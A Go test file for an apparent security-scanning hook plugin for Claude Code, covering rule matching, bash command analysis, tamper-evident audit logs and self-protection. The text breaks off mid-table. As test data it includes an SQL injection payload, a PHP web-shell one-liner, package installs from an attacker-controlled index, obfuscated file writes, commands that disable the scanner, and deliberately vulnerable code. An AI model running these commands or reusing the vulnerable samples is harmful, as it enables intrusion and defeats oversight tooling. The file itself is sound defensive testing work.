package main

import (
	"encoding/json"
	"os"
	"path/filepath"
	"regexp"
	"regexp/syntax"
	"strings"
	"sync"
	"testing"
	"time"
)

func TestPluginManifestDoesNotRedeclareAutoloadPaths(t *testing.T) {
	// Claude Code auto-loads hooks/hooks.json and skills/. Re-declaring them
	// in plugin.json is loaded a second time and the plugin UI shows
	// "Duplicate hooks file detected" / "1 error" on every install.
	b, err := os.ReadFile(filepath.Join(".", ".claude-plugin", "plugin.json"))
	if err != nil {
		t.Fatal(err)
	}
	var m map[string]any
	if err := json.Unmarshal(b, &m); err != nil {
		t.Fatal(err)
	}
	norm := func(p string) string {
		return strings.TrimSuffix(filepath.ToSlash(strings.TrimSpace(p)), "/")
	}
	if h, ok := m["hooks"].(string); ok {
		switch n := norm(h); n {
		case "./hooks/hooks.json", "hooks/hooks.json", "./hooks", "hooks":
			t.Fatalf("plugin.json hooks=%q redeclares the auto-loaded hooks/hooks.json; omit the field so marketplace install does not report Duplicate hooks file detected", h)
		}
	}
	var skillPaths []string
	switch s := m["skills"].(type) {
	case string:
		skillPaths = []string{s}
	case []any:
		for _, x := range s {
			if p, ok := x.(string); ok {
				skillPaths = append(skillPaths, p)
			}
		}
	}
	for _, p := range skillPaths {
		switch n := norm(p); n {
		case "./skills", "skills":
			t.Fatalf("plugin.json skills=%q redeclares the auto-loaded skills/ directory; omit the field", p)
		}
	}
}

func TestLowAssurancePathDowngrade(t *testing.T) {
	kb := loadKB()
	code := `cur.execute(f"SELECT * FROM t WHERE id={x}")`
	if f := kb.scan("src/db.py", code); len(f) == 0 || f[0].Confidence != "high" {
		t.Fatalf("production path: want high finding, got %v", f)
	}
	for _, p := range []string{"tests/test_db.py", "vendor/x.py", "examples/demo.py", "src/__tests__/db.py", "spec/db.py"} {
		f := kb.scan(p, code)
		if len(f) == 0 {
			t.Errorf("%s: expected a (downgraded) finding, got none", p)
			continue
		}
		if f[0].Confidence == "high" {
			t.Errorf("%s: expected downgrade to medium, still high", p)
		}
	}
}

func TestKBExemplarConsistency(t *testing.T) {
	kb := loadKB()
	if len(kb.Rules) == 0 {
		t.Fatal("no rules loaded")
	}
	for i := range kb.Rules {
		r := &kb.Rules[i]
		if len(r.Patterns) == 0 || r.Exemplar.Noncompliant == "" {
			continue
		}
		if !scanHitsCWE(kb, r.CWE, r.Exemplar.Noncompliant) {
			t.Errorf("%s: noncompliant exemplar not caught:\n  %s", r.CWE, r.Exemplar.Noncompliant)
		}
		if r.Exemplar.Compliant != "" && scanHitsCWE(kb, r.CWE, r.Exemplar.Compliant) {
			t.Errorf("%s: compliant exemplar FALSE-POSITIVES:\n  %s", r.CWE, r.Exemplar.Compliant)
		}
	}
}

func scanHitsCWE(kb *KB, cwe, content string) bool {
	for _, path := range []string{"x.py", "x.js", "x.go", "x.rs", "x.hs", "x.txt"} {
		for _, f := range kb.scan(path, content) {
			if f.Rule.CWE == cwe {
				return true
			}
		}
	}
	return false
}

func TestRequiredLiteralSafety(t *testing.T) {
	cases := []struct{ re, want string }{
		{`os\.system\(`, "system"},
		{`\bxp_cmdshell\b`, "xp_cmdshell"},
		{`(?i)MODE_ECB\b`, "mode_ecb"},
		{`(?:log(?:ger)?)\s*[.(][^)\n]{0,120}\baadhaar\b`, "aadhaar"},
		{`a{0,200}bcdef`, "bcdef"},
		{`(?:eval|exec)\(`, ""},
		{`foo|bar`, ""},
		{`[A-Z]{3,}`, ""},
		{`re\.compile\(`, "compile"},
	}
	for _, c := range cases {
		if got := requiredLiteral(c.re); got != c.want {
			t.Errorf("requiredLiteral(%q) = %q, want %q", c.re, got, c.want)
		}
	}
	kb := loadKB()
	for i := range kb.Rules {
		r := &kb.Rules[i]
		if r.Exemplar.Noncompliant == "" {
			continue
		}
		low := strings.ToLower(r.Exemplar.Noncompliant)
		for j := range r.Patterns {
			p := &r.Patterns[j]
			if len(p.prefilter) > 0 && p.match(r.Exemplar.Noncompliant) && prefilterMiss(p.prefilter, low) {
				t.Errorf("%s: prefilter set %v absent from its own noncompliant exemplar (would false-skip)", r.CWE, p.prefilter)
			}
		}
	}
}

func TestPrefilterSoundness(t *testing.T) {
	kb := loadKB()
	for i := range kb.Rules {
		r := &kb.Rules[i]
		for j := range r.Patterns {
			p := &r.Patterns[j]
			if len(p.prefilter) == 0 || r.Exemplar.Noncompliant == "" {
				continue
			}
			if p.match(r.Exemplar.Noncompliant) && prefilterMiss(p.prefilter, strings.ToLower(r.Exemplar.Noncompliant)) {
				t.Errorf("%s: unsound prefilter %v for %q", r.CWE, p.prefilter, p.Re)
			}
		}
	}
	cases := []struct {
		re   string
		want []string
	}{
		{`MODE_ECB\b|\bmodes\.ECB\(`, []string{"mode_ecb", "modes"}},
		{`(?:eval|exec)\(`, []string{"eval", "exec"}},
		{`(?i)(?:razorpay_signature|payu_hash)\b`, []string{"razorpay_signature", "payu_hash"}},
		{`__\$\{[^}\n]*\}__`, []string{"__${"}},
		{`foo|bar`, []string{"foo", "bar"}},
		{`ab|cd`, nil},
	}
	for _, c := range cases {
		got := requiredLiterals(c.re)
		if len(got) != len(c.want) {
			t.Errorf("requiredLiterals(%q) = %v, want %v", c.re, got, c.want)
			continue
		}
		for i := range got {
			if got[i] != c.want[i] {
				t.Errorf("requiredLiterals(%q) = %v, want %v", c.re, got, c.want)
				break
			}
		}
	}
}

func TestFreshnessCheck(t *testing.T) {
	recent := time.Now().AddDate(0, 0, -10).Format("2006-01-02")
	old := time.Now().AddDate(-4, 0, 0).Format("2006-01-02")
	if !freshlyCreated(`{"time":{"created":"` + recent + `T00:00:00Z"}}`) {
		t.Error("a 10-day-old package should be flagged fresh")
	}
	if freshlyCreated(`{"upload_time_iso_8601":"` + old + `T00:00:00"}`) {
		t.Error("a 4-year-old package must NOT be flagged fresh")
	}
	if freshlyCreated(`{"info":{"name":"x"}}`) {
		t.Error("no date present must NOT be flagged fresh")
	}
	if freshlyCreated(`{"urls":[{"upload_time_iso_8601":"` + recent + `T00:00:00"},{"upload_time_iso_8601":"2000-01-01T00:00:00"}]}`) {
		t.Error("earliest upload (2000) should make it not-fresh")
	}
	if !freshlyCreated(`{"time":{"created":"` + recent + `T00:00:00Z"},"readme":"stable since 1999-01-01"}`) {
		t.Error("a date in the readme must not spoof a fresh package into looking old")
	}
}

func TestNegTestHintLiteral(t *testing.T) {
	hint := `submit name = "' OR '1'='1' -- " and assert the query errors`
	pl := payloadOf(hint)
	if pl == "" || !strings.Contains(pl, "OR '1'='1'") {
		t.Fatalf("payloadOf did not extract the SQLi payload: %q", pl)
	}
	if testExercised("I added a test that returns a 400 error", hint, true) {
		t.Error("generic test mention should not satisfy an armed payload hint")
	}
	if !testExercised(`def test_sqli(): assert query("' OR '1'='1' -- ") raises`, hint, true) {
		t.Error("a test exercising the payload literal should satisfy the gate")
	}
	if !testExercised("added a test that rejects bad input", "generic input", true) {
		t.Error("fallback to mentionsTest failed when no payload is present")
	}
}

func TestBashInstallExtraction(t *testing.T) {
	a := analyzeBash("pip install requests flask && npm i react-router-dom")
	names := map[string]bool{}
	for _, in := range a.Installs {
		names[in.Pkg] = true
	}
	for _, want := range []string{"requests", "flask", "react-router-dom"} {
		if !names[want] {
			t.Errorf("install extraction missed %q (got %v)", want, names)
		}
	}
}

func TestBashGrepDashIIsNotPipIndex(t *testing.T) {
	cmds := []string{
		`ls ~/.claude/plugins/cache/ 2>/dev/null; ls ~/.claude/plugins/cache/peephole/*/ 2>/dev/null; cat ~/.claude/plugins/installed_plugins.json 2>/dev/null | grep -A8 -i peephole`,
		`grep -i peephole README.md`,
		`grep -i https://evil.example.com/simple installed_plugins.json`,
		`rg -i peephole`,
	}
	for _, cmd := range cmds {
		a := analyzeBash(cmd)
		if len(a.InstallSmells) != 0 {
			t.Errorf("grep/rg -i must not be treated as pip -i: %q -> %v", cmd, a.InstallSmells)
		}
	}
}

func TestBashPipUnofficialIndex(t *testing.T) {
	for _, cmd := range []string{
		"pip install -i https://evil.example/simple requests",
		"pip3 install --index-url https://evil.example/simple flask",
		"pip install --extra-index-url=http://127.0.0.1:9/simple pkg",
		"uv pip install --index-url https://evil.example/simple requests",
		"pip install --index-url=https://evil.example/simple pkg",
	} {
		a := analyzeBash(cmd)
		if len(a.InstallSmells) == 0 {
			t.Errorf("expected unofficial index smell: %q", cmd)
		}
	}
	if a := analyzeBash("pip install --index-url https://pypi.org/simple requests"); len(a.InstallSmells) != 0 {
		t.Errorf("official pypi must not smell: %+v", a.InstallSmells)
	}
	if a := analyzeBash("pip install requests"); len(a.InstallSmells) != 0 {
		t.Errorf("default-index install must not smell: %+v", a.InstallSmells)
	}
}

func TestBashHeredocExtraction(t *testing.T) {
	cmd := "cat > f.py <<'EOF'\nsecret = 1\nEOF"
	a := analyzeBash(cmd)
	if len(a.Payloads) == 0 || !strings.Contains(a.Payloads[0].Content, "secret = 1") {
		t.Fatalf("heredoc body not extracted: %+v", a.Payloads)
	}
	found := false
	for _, t2 := range a.Targets {
		if t2 == "f.py" {
			found = true
		}
	}
	if !found {
		t.Errorf("redirect target not detected: %v", a.Targets)
	}
}

func TestBashInterpExtraction(t *testing.T) {
	a := analyzeBash(`python3 -c "import os; os.system('id')"`)
	if len(a.Payloads) == 0 || !strings.Contains(a.Payloads[0].Content, "os.system") {
		t.Fatalf("interpreter payload not extracted: %+v", a.Payloads)
	}
}

func TestBashUninspectableFlagged(t *testing.T) {
	a := analyzeBash("echo aW1wb3J0IG9z | base64 -d > payload.py")
	if !a.Uninspectable {
		t.Error("base64-decoded write should be flagged uninspectable")
	}
}

func TestBashLooksLiveSkipsBenign(t *testing.T) {
	for _, cmd := range []string{"echo hello", "git status", "true", "ls -la"} {
		if bashLooksLive(cmd) {
			t.Errorf("benign command should skip analysis: %q", cmd)
		}
		if a := analyzeBash(cmd); a.Uninspectable || len(a.Payloads) != 0 || len(a.Installs) != 0 {
			t.Errorf("benign command produced work: %q -> %+v", cmd, a)
		}
	}
	for _, cmd := range []string{
		"chmod 777 /app",
		"pip install evilpkg",
		"cat > f.py <<EOF\nimport os\nEOF",
		"python3 -c 'os.system(x)'",
		"cp /tmp/evil.py app.py",
	} {
		if !bashLooksLive(cmd) {
			t.Errorf("live command skipped analysis (would be a hole): %q", cmd)
		}
	}
}

func TestBashCopyMoveWithTrailingSeparator(t *testing.T) {
	for _, cmd := range []string{
		"cp /tmp/evil.py routes.py; echo done",
		"mv /tmp/evil.py app.py && true",
		"cp /tmp/evil.py routes.py",
	} {
		a := analyzeBash(cmd)
		if !a.Uninspectable {
			t.Errorf("copy/move write not flagged uninspectable: %q -> %+v", cmd, a)
		}
	}
}

func TestBashInterpEscapedQuoteNotTruncated(t *testing.T) {
	a := analyzeBash(`python3 -c "x=\"\"; import os; os.system(user)"`)
	joined := ""
	for _, p := range a.Payloads {
		joined += p.Content
	}
	if !strings.Contains(joined, "os.system(user)") && !a.Uninspectable {
		t.Fatalf("escaped-quote interpreter code was dropped: payloads=%+v uninspectable=%v", a.Payloads, a.Uninspectable)
	}
}

func TestBashPhpDashRInline(t *testing.T) {
	a := analyzeBash(`php -r 'system($_GET[x]);'`)
	joined := ""
	for _, p := range a.Payloads {
		joined += p.Content
	}
	if !strings.Contains(joined, "system($_GET") && !a.Uninspectable {
		t.Fatalf("php -r inline code not inspected: payloads=%+v uninspectable=%v", a.Payloads, a.Uninspectable)
	}
	if b := analyzeBash(`node -r ./config.js server.js`); len(b.Payloads) > 0 {
		t.Errorf("node -r (module preload) wrongly treated as inline code: %+v", b.Payloads)
	}
}

func TestSemReviewTagsJSIdorCsrf(t *testing.T) {
	for name, code := range map[string]string{
		"express-idor":  "app.get('/api/orders/:id', async (req,res) => {\n  const o = await Order.findById(req.params.id);\n});",
		"sequelize-pk":  "const u = await User.findByPk(req.params.id);",
		"prisma-unique": "const o = await prisma.order.findUnique({where:{id:req.params.id}});",
		"express-post":  "router.post('/transfer', handler);",
	} {
		if len(semReviewKeys(code)) == 0 {
			t.Errorf("%s: JS IDOR/CSRF not tagged, Stop self-review would not fire: %q", name, code)
		}
	}
}

func TestHeredocBombBounded(t *testing.T) {
	cmd := strings.Repeat("<<E\n", 256*1024/4)
	start := time.Now()
	a := analyzeBash(cmd)
	if d := time.Since(start); !raceEnabled && d > 500*time.Millisecond {
		t.Fatalf("heredoc-bomb took %v - still superlinear", d)
	}
	if !a.Uninspectable {
		t.Error("a heredoc-bomb past the opener cap must be flagged uninspectable")
	}
	if b := analyzeBash("cat > a.py <<EOF\nimport os\nEOF\ncat > b.py <<EOF\nx=1\nEOF"); len(b.Payloads) < 2 {
		t.Errorf("normal 2-heredoc command lost payloads: %+v", b.Payloads)
	}
}

func TestBashWritePrimitiveEvasions(t *testing.T) {
	for _, cmd := range []string{
		`echo "${CODE}" > /app/x.py`,
		`install -m 0755 /tmp/evil.py /app/routes.py`,
		`echo -e "\x69\x6d\x70\x6f\x72\x74 os" > /app/x.py`,
		`printf "%b" "\x69mport os" > /app/x.py`,
	} {
		if a := analyzeBash(cmd); !a.Uninspectable {
			t.Errorf("write primitive not flagged uninspectable: %q", cmd)
		}
	}
	if a := analyzeBash(`printf "%b\n" "$x"`); a.Uninspectable {
		t.Errorf("benign printf to stdout wrongly flagged uninspectable")
	}
	for _, cmd := range []string{"npm install -g typescript", "pip install -v flask", "apt install -s nginx", "apt-get install -d curl"} {
		if a := analyzeBash(cmd); a.Uninspectable {
			t.Errorf("package-manager install wrongly flagged as coreutils install: %q", cmd)
		}
	}
	for _, cmd := range []string{"install -m 0755 /tmp/x /app/y", "sudo install -m 0755 x y"} {
		if a := analyzeBash(cmd); !a.Uninspectable {
			t.Errorf("coreutils install not flagged uninspectable: %q", cmd)
		}
	}
}

func TestAddSessionSetConcurrent(t *testing.T) {
	sd := t.TempDir()
	os.MkdirAll(sd, 0o700)
	classes := []string{"idor", "race", "csrf", "bizlogic", "ratelimit", "xss", "ssrf", "path"}
	var wg sync.WaitGroup
	for _, c := range classes {
		wg.Add(1)
		go func(c string) { defer wg.Done(); markSemReview(sd, "s1", []string{c}) }(c)
	}
	wg.Wait()
	got := map[string]bool{}
	for _, k := range sessionSemReview(sd, "s1") {
		got[k] = true
	}
	for _, c := range classes {
		if !got[c] {
			t.Errorf("concurrent write lost class %q (kept: %v)", c, got)
		}
	}
}

func TestLogChainDetectsTampering(t *testing.T) {
	sd := t.TempDir()
	for i := 0; i < chainEvery+5; i++ {
		appendLog(sd, logEntry{Decision: "allow", Tool: "Write"})
	}
	if ok, _ := verifyChain(sd); !ok {
		t.Fatal("freshly written chain should verify")
	}
	corruptLogLine(t, sd)
	if ok, _ := verifyChain(sd); ok {
		t.Fatal("chain verification should FAIL after tampering")
	}
}

func TestLogChainDetectsTailTruncation(t *testing.T) {
	sd := t.TempDir()
	for i := 0; i < 5; i++ {
		appendLog(sd, logEntry{Decision: "deny", Tool: "Write"})
	}
	if ok, _ := verifyChain(sd); !ok {
		t.Fatal("fresh short log should verify")
	}
	p := filepath.Join(sd, "log.jsonl")
	b, _ := os.ReadFile(p)
	lines := strings.Split(strings.TrimRight(string(b), "\n"), "\n")
	os.WriteFile(p, []byte(strings.Join(lines[:len(lines)-1], "\n")+"\n"), 0o600)
	if ok, _ := verifyChain(sd); ok {
		t.Fatal("tail truncation should be detected as tampering")
	}
}

func seedLog(t *testing.T, sd string, ents []logEntry) {
	t.Helper()
	if err := os.MkdirAll(sd, 0o700); err != nil {
		t.Fatal(err)
	}
	running := ""
	var buf []byte
	for i, ent := range ents {
		ent.Chain = ""
		running = foldEntry(running, ent)
		if (i+1)%chainEvery == 0 {
			ent.Chain = running
		}
		line, err := json.Marshal(ent)
		if err != nil {
			t.Fatal(err)
		}
		buf = append(buf, line...)
		buf = append(buf, '\n')
	}
	if err := os.WriteFile(logPath(sd), buf, 0o600); err != nil {
		t.Fatal(err)
	}
	writeHead(sd, running, len(ents))
}

func readLogDecisions(t *testing.T, sd string) []string {
	t.Helper()
	b, err := os.ReadFile(logPath(sd))
	if err != nil {
		if os.IsNotExist(err) {
			return nil
		}
		t.Fatal(err)
	}
	var out []string
	for _, ln := range strings.Split(strings.TrimRight(string(b), "\n"), "\n") {
		if ln == "" {
			continue
		}
		var ent logEntry
		if err := json.Unmarshal([]byte(ln), &ent); err != nil {
			t.Fatal(err)
		}
		out = append(out, ent.Decision)
	}
	return out
}

func TestLogRetentionDropsOldKeepsRecent(t *testing.T) {
	sd := t.TempDir()
	old := time.Now().Add(-31 * 24 * time.Hour).Unix()
	recent := time.Now().Add(-2 * 24 * time.Hour).Unix()
	seedLog(t, sd, []logEntry{
		{TS: old, Decision: "allow", Tool: "Write"},
		{TS: old, Decision: "deny", Tool: "Write"},
		{TS: recent, Decision: "ask", Tool: "Write"},
		{TS: recent, Decision: "allow", Tool: "Edit"},
	})
	pruneAuditLog(sd)
	got := readLogDecisions(t, sd)
	if strings.Join(got, ",") != "ask,allow" {
		t.Fatalf("kept %v, want ask,allow", got)
	}
	if ok, at := verifyChain(sd); !ok {
		t.Fatalf("resealed chain must verify, broke at %d", at)
	}
}

func TestLogRetentionDeletesAllOld(t *testing.T) {
	sd := t.TempDir()
	old := time.Now().Add(-40 * 24 * time.Hour).Unix()
	seedLog(t, sd, []logEntry{
		{TS: old, Decision: "allow", Tool: "Write"},
		{TS: old, Decision: "deny", Tool: "Write"},
	})
	pruneAuditLog(sd)
	if _, err := os.Stat(logPath(sd)); !os.IsNotExist(err) {
		t.Fatalf("expected log removed, err=%v", err)
	}
	if h, n := readHead(sd); h != "" || n != 0 {
		t.Fatalf("head after empty prune: %q %d", h, n)
	}
	if ok, _ := verifyChain(sd); !ok {
		t.Fatal("empty retained log must still verify")
	}
}

func TestLogRetentionDeletesRotatedArchive(t *testing.T) {
	sd := t.TempDir()
	recent := time.Now().Add(-time.Hour).Unix()
	seedLog(t, sd, []logEntry{{TS: recent, Decision: "allow", Tool: "Write"}})
	rotated := logPath(sd) + ".1"
	if err := os.WriteFile(rotated, []byte("{\"ts\":1,\"decision\":\"allow\"}\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	old := time.Now().Add(-40 * 24 * time.Hour)
	if err := os.Chtimes(rotated, old, old); err != nil {
		t.Fatal(err)
	}
	tmp := logPath(sd) + ".tmp"
	if err := os.WriteFile(tmp, []byte("partial"), 0o600); err != nil {
		t.Fatal(err)
	}
	pruneAuditLog(sd)
	if _, err := os.Stat(rotated); !os.IsNotExist(err) {
		t.Fatal("expired log.jsonl.1 must be removed")
	}
	if _, err := os.Stat(tmp); !os.IsNotExist(err) {
		t.Fatal("leftover log.jsonl.tmp must be removed")
	}
	if strings.Join(readLogDecisions(t, sd), ",") != "allow" {
		t.Fatal("current log must be untouched when first entry is in window")
	}
}

func TestLogRetentionRecoversTmp(t *testing.T) {
	sd := t.TempDir()
	recent := time.Now().Add(-time.Hour).Unix()
	seedLog(t, sd, []logEntry{{TS: recent, Decision: "ask", Tool: "Write"}})
	if err := os.Rename(logPath(sd), logPath(sd)+".tmp"); err != nil {
		t.Fatal(err)
	}
	pruneAuditLog(sd)
	if strings.Join(readLogDecisions(t, sd), ",") != "ask" {
		t.Fatal("compact crash window must restore log.jsonl from tmp")
	}
	if _, err := os.Stat(logPath(sd) + ".tmp"); !os.IsNotExist(err) {
		t.Fatal("recovered tmp must not remain")
	}
}

func TestLogRetentionKeepsRecentArchive(t *testing.T) {
	sd := t.TempDir()
	recent := time.Now().Add(-time.Hour).Unix()
	seedLog(t, sd, []logEntry{{TS: recent, Decision: "allow", Tool: "Write"}})
	rotated := logPath(sd) + ".1"
	if err := os.WriteFile(rotated, []byte("{}\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	pruneAuditLog(sd)
	if _, err := os.Stat(rotated); err != nil {
		t.Fatal("recent log.jsonl.1 must be kept")
	}
}

func TestLogRotateReplacesArchive(t *testing.T) {
	sd := t.TempDir()
	p := logPath(sd)
	if err := os.MkdirAll(sd, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(p+".1", []byte("old-archive\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(p, make([]byte, logMaxBytes+1), 0o600); err != nil {
		t.Fatal(err)
	}
	writeHead(sd, "dead", 99)
	appendLog(sd, logEntry{Decision: "allow", Tool: "Write"})
	st, err := os.Stat(p + ".1")
	if err != nil {
		t.Fatal("rotate must produce log.jsonl.1")
	}
	if st.Size() != logMaxBytes+1 {
		t.Fatalf("rotated size %d, want %d", st.Size(), logMaxBytes+1)
	}
	got := readLogDecisions(t, sd)
	if len(got) != 1 || got[0] != "allow" {
		t.Fatalf("current log after rotate: %v", got)
	}
	if ok, at := verifyChain(sd); !ok {
		t.Fatalf("chain after rotate broke at %d", at)
	}
}

func TestMaybePruneSkipsFreshStamp(t *testing.T) {
	sd := t.TempDir()
	old := time.Now().Add(-40 * 24 * time.Hour).Unix()
	seedLog(t, sd, []logEntry{{TS: old, Decision: "deny", Tool: "Write"}})
	if err := os.WriteFile(pruneStampPath(sd), []byte("1\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	maybePruneAuditLog(sd)
	if strings.Join(readLogDecisions(t, sd), ",") != "deny" {
		t.Fatal("fresh prune stamp must skip compaction")
	}
}

func TestLogRetentionResealsLongChain(t *testing.T) {
	sd := t.TempDir()
	old := time.Now().Add(-31 * 24 * time.Hour).Unix()
	recent := time.Now().Unix()
	ents := make([]logEntry, 0, chainEvery+10)
	for i := 0; i < chainEvery; i++ {
		ents = append(ents, logEntry{TS: old, Decision: "allow", Tool: "Write"})
	}
	for i := 0; i < 7; i++ {
		ents = append(ents, logEntry{TS: recent, Decision: "deny", Tool: "Write"})
	}
	seedLog(t, sd, ents)
	if ok, _ := verifyChain(sd); !ok {
		t.Fatal("seeded long chain should verify")
	}
	pruneAuditLog(sd)
	got := readLogDecisions(t, sd)
	if len(got) != 7 {
		t.Fatalf("kept %d, want 7 recent", len(got))
	}
	if ok, at := verifyChain(sd); !ok {
		t.Fatalf("resealed long chain broke at %d", at)
	}
}

func TestNoUncompilablePatterns(t *testing.T) {
	if bad := loadKB().uncompilable(); len(bad) > 0 {
		t.Fatalf("KB has uncompilable patterns: %v", bad)
	}
}

func corruptLogLine(t *testing.T, sd string) {
	t.Helper()
	p := filepath.Join(sd, "log.jsonl")
	b, err := os.ReadFile(p)
	if err != nil {
		t.Fatal(err)
	}
	lines := strings.Split(string(b), "\n")
	lines[3] = strings.Replace(lines[3], `"decision":"allow"`, `"decision":"deny"`, 1)
	os.WriteFile(p, []byte(strings.Join(lines, "\n")), 0o600)
}

func TestMCPScanText(t *testing.T) {
	kb := loadKB()
	vuln := mcpScanText(kb, "a.py", `cur.execute(f"SELECT * FROM t WHERE id={x}")`)
	if !strings.Contains(vuln, "HIGH-confidence") || !strings.Contains(vuln, "CWE-89") {
		t.Errorf("expected HIGH CWE-89 finding, got: %q", vuln)
	}
	clean := mcpScanText(kb, "a.py", `cur.execute("SELECT 1")`)
	if !strings.Contains(clean, "no security findings") {
		t.Errorf("expected clean verdict, got: %q", clean)
	}
}

func TestLSPDiagnostics(t *testing.T) {
	kb := loadKB()
	d := lspDiagnostics(kb, "file:///a.py", `cur.execute(f"SELECT * FROM t WHERE id={x}")`)
	if len(d) == 0 {
		t.Fatal("expected a diagnostic for SQLi")
	}
	m := d[0].(map[string]any)
	if m["code"] != "CWE-89" || m["severity"] != 1 {
		t.Errorf("expected CWE-89 severity 1 (error), got code=%v sev=%v", m["code"], m["severity"])
	}
	if len(lspDiagnostics(kb, "file:///a.py", "x = 1")) != 0 {
		t.Error("clean code should have no diagnostics")
	}
}

func TestKBSchemaComplete(t *testing.T) {
	kb := loadKB()
	if len(kb.Rules) == 0 {
		t.Fatal("no rules loaded")
	}
	for i := range kb.Rules {
		r := &kb.Rules[i]
		if r.CWE == "" || !strings.HasPrefix(r.CWE, "CWE-") {
			t.Errorf("rule %q: bad cwe_id %q", r.Name, r.CWE)
		}
		if r.Name == "" {
			t.Errorf("%s: missing name", r.CWE)
		}
		if len(r.TaskTriggers) == 0 {
			t.Errorf("%s (%s): missing task_triggers", r.CWE, r.Name)
		}
		if r.AttackScenario == "" {
			t.Errorf("%s (%s): missing attack_scenario", r.CWE, r.Name)
		}
		if len(r.NegativeHints) != 1 {
			t.Errorf("%s (%s): negative_test_hint must be exactly one hint", r.CWE, r.Name)
		} else if payloadOf(r.NegativeHints[0]) == "" {
			t.Errorf("%s (%s): hint carries no extractable adversarial payload (need a quoted literal >= 5 chars): %q",
				r.CWE, r.Name, r.NegativeHints[0])
		}
		if len(r.Patterns) > 0 {
			if r.Exemplar.Noncompliant == "" || r.Exemplar.Compliant == "" {
				t.Errorf("%s (%s): enforced rule missing exemplar pair", r.CWE, r.Name)
			}
			if r.Exemplar.Explanation == "" {
				t.Errorf("%s (%s): missing exemplar explanation", r.CWE, r.Name)
			}
		}
		for _, p := range r.Patterns {
			if p.Confidence != "high" && p.Confidence != "medium" {
				t.Errorf("%s: pattern with bad confidence %q", r.CWE, p.Confidence)
			}
		}
	}
}

func TestModeLowerBypass(t *testing.T) {
	viol := func(cmd string) bool {
		ok, _ := selfProtectViolation(Event{ToolName: "Bash"}, ToolInput{Command: cmd})
		return ok
	}
	block := []string{
		"peephole mode off",
		"P=peephole; $P mode off",
		"p=peephole && $p mode audit",
		"X=/usr/bin/peephole; ${X} mode strict",
		`eval "peephole mode off"`,
		"B=.peephole; rm -rf $B",
	}
	for _, c := range block {
		if !viol(c) {
			t.Errorf("self-protection should BLOCK but allowed: %q", c)
		}
	}
	allow := []string{"echo hello", "P=1; echo $P", "git status", "npm test"}
	for _, c := range allow {
		if viol(c) {
			t.Errorf("self-protection should ALLOW but blocked: %q", c)
		}
	}
}

func TestTaintSpecExemplars(t *testing.T) {
	kb := loadKB()
	if len(generatedTaintSpecs) == 0 {
		t.Fatal("no taint specs generated")
	}
	for i := range generatedTaintSpecs {
		s := &generatedTaintSpecs[i]
		if s.Noncompliant == "" {
			continue
		}
		if !scanHitsCWE(kb, s.CWE, s.Noncompliant) {
			t.Errorf("%s taint spec: noncompliant exemplar not caught:\n%s", s.CWE, s.Noncompliant)
		}
		if s.Compliant != "" && scanHitsCWE(kb, s.CWE, s.Compliant) {
			t.Errorf("%s taint spec: compliant exemplar FALSE-POSITIVES:\n%s", s.CWE, s.Compliant)
		}
	}
}

func taintCWEs(t *testing.T, path, code string) map[string]bool {
	t.Helper()
	kb := loadKB()
	m := map[string]bool{}
	for _, f := range kb.scan(path, code) {
		m[f.Rule.CWE] = true
	}
	return m
}

func TestTaintCrossLineCatches(t *testing.T) {
	cases := []struct {
		name, path, code, cwe string
	}{
		{"ssti-fstring", "app.py",
			"name = request.args.get('name')\ntmpl = f\"Hello {name}!\"\nreturn render_template_string(tmpl)\n", "CWE-1336"},
		{"ssti-concat", "app.py",
			"tmpl = \"Hi \" + name\nreturn render_template_string(tmpl)\n", "CWE-1336"},
		{"ssti-return-adjacent", "app.py",
			"greeting = f\"Hello {request.args['n']}\"\nreturn render_template_string(greeting)\n", "CWE-1336"},
		{"sqli-fstring", "db.py",
			"uid = request.args.get('id')\nq = f\"SELECT * FROM users WHERE id={uid}\"\ncur.execute(q)\n", "CWE-89"},
		{"cmdi-system", "run.py",
			"host = request.args.get('host')\ncmd = \"ping \" + host\nos.system(cmd)\n", "CWE-78"},
		{"cmdi-subprocess-shell", "run.py",
			"host = request.args.get('host')\ncmd = \"ping \" + host\nsubprocess.run(cmd, shell=True)\n", "CWE-78"},
		{"sqli-js-concat", "app.js",
			"const id = req.params.id;\nconst q = \"SELECT * FROM users WHERE id = \" + id;\ndb.query(q);\n", "CWE-89"},
		{"path-js-concat", "app.js",
			"const name = req.query.file;\nconst full = baseDir + \"/\" + name;\nfs.readFile(full, cb);\n", "CWE-22"},
		{"cmdi-sanitizer-spoof", "run.py",
			"host = request.args.get('host')\ncmd = \"ping \" + shlex.quote(other) + host\nos.system(cmd)\n", "CWE-78"},
		{"cmdi-augmented-assign", "run.py",
			"cmd = \"ping \"\ncmd += request.args.get('host')\nos.system(cmd)\n", "CWE-78"},
		{"sqli-augmented-assign-js", "app.js",
			"let q = \"SELECT * FROM t WHERE id=\"\nq += req.query.id\ndb.query(q)\n", "CWE-89"},
		{"code-eval", "calc.py",
			"expr = request.args.get('expr')\nresult = eval(expr)\n", "CWE-94"},
		{"deser-yaml-user", "load.py",
			"data = request.data\ncfg = yaml.load(data)\n", "CWE-502"},
		{"xss-innerhtml", "page.js",
			"const msg = `<b>${userInput}</b>`;\nel.innerHTML = msg;\n", "CWE-79"},
		{"alias-hop", "app.py",
			"raw = f\"Hi {request.args['n']}\"\nt = raw\nrender_template_string(t)\n", "CWE-1336"},
		{"ssrf-user-url", "fetch.py",
			"u = request.args.get('url')\nr = requests.get(u)\n", "CWE-918"},
		{"path-traversal", "dl.py",
			"fn = request.args.get('file')\ndata = open(fn).read()\n", "CWE-22"},
		{"path-concat", "dl.py",
			"name = request.args.get('n')\nreturn open('/var/data/' + name).read()\n", "CWE-22"},
		{"path-join", "dl.py",
			"name = request.args.get('name')\nreturn open(os.path.join('./files', name), 'rb').read()\n", "CWE-22"},
		{"path-concat-left", "dl.py",
			"name = request.args.get('n')\nbase = '/var/data/'\nreturn open(base + name).read()\n", "CWE-22"},
		{"path-js-expr", "app.js",
			"const n = req.query.file;\nfs.readFile('./files/' + n, cb);\n", "CWE-22"},
		{"open-redirect", "app.py",
			"dest = request.args.get('next')\nreturn redirect(dest)\n", "CWE-601"},
		{"sens-log-var", "auth.py",
			"pw = request.form['password']\nlogger.debug(pw)\n", "CWE-532"},
		{"sens-log-byname", "auth.py",
			"logging.info(access_token)\n", "CWE-532"},
		{"exfil-env-crossline", "boot.py",
